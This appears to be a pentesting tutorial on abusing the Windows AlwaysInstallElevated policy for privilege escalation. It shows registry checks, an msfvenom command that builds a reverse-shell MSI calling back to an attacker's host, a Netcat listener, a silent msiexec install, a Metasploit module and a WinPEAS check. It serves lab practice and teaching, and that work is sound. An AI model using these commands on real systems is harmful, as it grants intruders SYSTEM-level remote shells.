 The AlwaysInstallElevated policy in Windows allows unprivileged users to install software using MSI (Microsoft Installer) packages with SYSTEM-level permissions. When this policy is enabled, any MSI package run by a user, regardless of their privileges, will execute with elevated permissions.




The Exploit

If a machine has the `AlwaysInstallElevated` policy enabled, an attacker could craft a malicious `.msi` package and run it using SYSTEM level privileges.

For this attack to work, the “AlwaysInstallElevated” value in following Registry keys has to be set to `1`.

1. The first step is to check whether the required registry keys are enabled:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![Screenshot from 2024-09-30 02-41-42](https://github.com/user-attachments/assets/9db77297-6a6e-46dd-9d4e-fe48976a9269)
2. A reverse shell should be crafted:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<our ip> LPORT=1234 -f msi > shell.msi
```
3. Transferring the shell.msi file to the Windows victim machine using the Python web server
4. The next step is to set up a Netcat listener:
```
nc -nlvp 1234 
```
5. The following command can then be used to install the .msi file:
```
msiexec /quiet /qn /i file.msi
```
* `/quiet` – quiet mode, which means there’s no user interaction required
* `/qn` – specifies there’s no UI during the installation process


Once the package is installed, the malicious code is executed, granting SYSTEM level access to the system through a reverse shell.





Metasploit Exploitation
--

This vulnerability can also be exploited by using the `exploit/windows/local/always_install_elevated` module.

Once a meterpreter shell is obtained, all that is required is to brackground the session, search for and set the module, set the session value and run it.

This has granted a SYSTEM level shell. Always try and perform the attack in a manual fashion first, especially when practicing it for the first time.










This can also be checked with automated scripts such as WinPEAS:
--
```
winpeas.exe quiet systeminfo
```
 
